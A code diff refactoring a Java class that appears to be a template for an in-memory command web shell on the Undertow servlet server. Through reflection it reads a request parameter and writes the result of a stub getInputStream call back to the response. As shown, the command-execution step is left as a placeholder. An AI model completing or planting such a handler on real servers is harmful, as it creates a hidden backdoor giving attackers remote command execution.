@@ -10,14 +10,6 @@ import java.io.OutputStream;
 public class CommandUndertowServletHandler {
     private static String paramName;
 
-    private String getParam(String param) {
-        return param;
-    }
-
-    private InputStream getInputStream(String cmd) throws Exception {
-        return null;
-    }
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
@@ -30,9 +22,9 @@ public class CommandUndertowServletHandler {
             }
             Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
             Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
-            String cmd = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
-            if (cmd != null) {
-                InputStream inputStream = getInputStream(cmd);
+            String param = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 byte[] buf = new byte[8192];
                 int length;
@@ -41,9 +33,17 @@ public class CommandUndertowServletHandler {
                 }
                 return true;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return false;
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 }
